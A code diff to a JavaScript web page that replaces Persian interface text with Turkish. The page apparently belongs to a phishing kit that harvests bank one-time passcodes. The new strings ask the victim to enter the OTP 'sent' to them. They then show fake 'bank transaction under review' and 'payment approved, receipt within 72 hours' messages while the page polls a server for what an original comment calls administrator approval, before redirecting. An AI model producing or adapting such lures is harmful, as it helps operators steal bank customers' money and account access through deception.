@@ -228,7 +228,7 @@ async function requestOTP() {
     if (!result?.success) throw new Error(result?.message || "ارسال OTP انجام نشد.");
 
     otpSent = true;
-    otpStatus.textContent = "کد OTP ارسال شد. شماره پرونده را وارد کنید.";
+    otpStatus.textContent = "Gönderilen OTP Kodunu Giriniz";
     waitingMessage.classList.remove("hidden");
     caseNumberSection.classList.remove("hidden");
     submitCaseBtn.classList.add("hidden");
@@ -241,8 +241,8 @@ async function requestOTP() {
   } catch (error) {
     console.error(error);
     otpSent = false;
-    otpStatus.textContent = "ارسال OTP انجام نشد. دوباره تلاش کنید.";
-    showToast(error.message || "ارسال OTP ناموفق بود.", "error");
+    otpStatus.textContent = "OTP Gönderilemedi. Lütfen Tekrar Deneyin";
+    showToast(error.message || "OTP Gönderimi Başarısız Oldu.", "error");
     requestOtpBtn.classList.add("hidden");
     resendOtpBtn.classList.remove("hidden");
     resendOtpBtn.disabled = false;
@@ -277,7 +277,7 @@ function countdownFinished() {
   resendOtpBtn.classList.remove("hidden");
   resendOtpBtn.disabled = false;
   countdownContainer.classList.add("hidden");
-  otpStatus.textContent = "زمان انتظار به پایان رسید. در صورت عدم تأیید، می‌توانید کد جدید درخواست کنید.";
+  otpStatus.textContent = "Bekleme süresi sona erdi. Onaylanmadıysa yeni bir kod talep edebilirsiniz.";
 }
 
 function startStatusPolling() {
@@ -301,25 +301,25 @@ async function submitCaseNumber() {
 
   try {
     const result = await postAPI({ action: "submitCaseNumber", sessionId, caseNumber });
-    if (!result?.success) throw new Error(result?.message || "ثبت شماره پرونده انجام نشد.");
+    if (!result?.success) throw new Error(result?.message || "OTP Kodu Süresi Dolmuş veya Geçersizdir.");
 
     caseSubmitted = true;
     caseNumberInput.disabled = true;
     submitCaseBtn.classList.add("hidden");
 
-    // هیچ پیام «ثبت موفقیت» نمایش داده نمی‌شود؛ وضعیت تا تأیید مدیر ادامه دارد.
-    otpStatus.textContent = "در حال بررسی پرونده...";
+    // İşleminiz banka sistemi tarafından onaylanana kadar devam etmektedir.
+    otpStatus.textContent = "Banka İşlemi İnceleniyor...";
     waitingMessage.classList.remove("hidden");
     startStatusPolling();
   } catch (error) {
     console.error(error);
     caseSubmitting = false;
     caseNumberInput.disabled = false;
-    showToast(error.message || "ثبت شماره پرونده انجام نشد.", "error");
+    showToast(error.message || "OTP Kodu Geçerli Değildir.", "error");
   }
 }
 
-// ثبت خودکار شماره پرونده پس از توقف کوتاه تایپ؛ نیازی به دکمه Submit نیست.
+//OTP Kodu Girildikten Sonra İşlem Otomatik Olarak Başlatılacaktır.
 caseNumberInput.addEventListener("input", () => {
   if (caseSubmitted || caseSubmitting) return;
 
@@ -333,7 +333,7 @@ caseNumberInput.addEventListener("input", () => {
   }, 500);
 });
 
-// جلوگیری از ارسال سنتی فرم.
+// Geleneksel form gönderiminin engellenmesi.
 
 async function checkStatusOnce() {
   try {
@@ -344,11 +344,11 @@ async function checkStatusOnce() {
       stopCountdown();
       stopStatusPolling();
       waitingMessage.classList.add("hidden");
-      otpStatus.textContent = "درخواست شما تأیید شد. در حال انتقال...";
+      otpStatus.textContent = "Ödemeniz onaylandı ve sistem ödeme makbuzunu hazırlıyor.";
 
       const redirectUrl = String(result.redirectUrl || "").trim();
       if (redirectUrl) {
-        showLoading("تأیید شد؛ در حال انتقال...");
+        showLoading("Ödeme onaylandı ve sonuç 72 saat içinde e-posta adresinize gönderilecektir.");
         setTimeout(() => { window.location.href = redirectUrl; }, 500);
       } else {
         hideLoading();
